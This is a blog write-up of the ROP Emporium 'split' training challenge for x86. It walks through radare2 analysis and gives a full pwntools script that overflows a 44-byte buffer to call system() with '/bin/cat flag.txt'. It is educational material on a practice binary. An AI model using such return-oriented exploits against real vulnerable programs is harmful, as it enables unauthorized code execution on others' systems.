---
layout: post
title:  "ROP Emporium split Writeup (x86)"
date:   2024-06-01 13:15:45 -0400
categories: rop-emporium split
tags: rop-emporium split x86 writeup buffer-overflow rop
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[second challenge](https://ropemporium.com/challenge/split.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

> This is what a hint will look like!
{: .prompt-tip }

### Goal
According to the
[challenge page](https://ropemporium.com/challenge/split.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call `system` with the argument `/bin/cat flag.txt`.
This string is also present in the binary!

### x86 Calling Convention
We know from the first challenge we need to set the
instruction pointer to a function address in order to
call that function. But how do we pass arguments to
those functions?

In `x86`, we pass each argument onto the stack. This is
easy since we already control the stack! There are other
[`x86` calling conventions](https://en.wikipedia.org/wiki/X86_calling_conventions){:target="_blank"}{:rel="noopener noreferrer"}
but passing arguments is all we need to know for
our purposes

## Exploit Crafting
The offset for `x86` challenges will be `44 bytes`. If
you want to know how to get this value see the
[ret2win writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}

### Function Address
> Is there an address where `system()` is called?
{: .prompt-tip }

Using `radare2` we can analyze a binary by
running `aaa`. To list functions with their
addresses we can run `afl`
![ret2win-addr](/images/split/x86-addr.png)

Let's investigate `usefulFunction`. We can view
the assembly with the following commands

```
s sym.usefulFunction
V
p
```

![useful-asm](/images/split/x86-useful-asm.png)

This function seems to `call` the `system()` function
with the argument `/bin/ls`. We want to change the
argument but let's take note of the `call` address
`0x0804861a`

### String Address
> The string `/bin/cat flag.txt` exists in the binary
{: .prompt-tip }
Using `radare2` again we can search for case insensitive
strings with the `/i` command. So to find the address
of `/bin/cat flag.txt` we run

```
/i /bin/cat flag.txt
```
![cat-addr](/images/split/x86-cat-addr.png)

Awesome the address of the string is `0x0804a030`

## Exploit
Now we have everything we need to build the exploit
```python
#!/bin/python3
from pwn import *

# useful addresses
str_addr = 0x0804a030
sys_addr = 0x0804861a

# create payload
payload = b'A' * 44
# call sys
payload += p32(sys_addr)
# set arg1
payload += p32(str_addr)

# send payload + receive flag
io = process('./split32')
io.recv()
io.sendline(payload)
print(io.recvline())
success(io.recvline())
```
![flag](/images/split/x86-flag.png)

## Conclusion
This challenge takes things a step further than
just calling an arbitrary function by introducting the 
ability to set arbitrary arguments for that function.
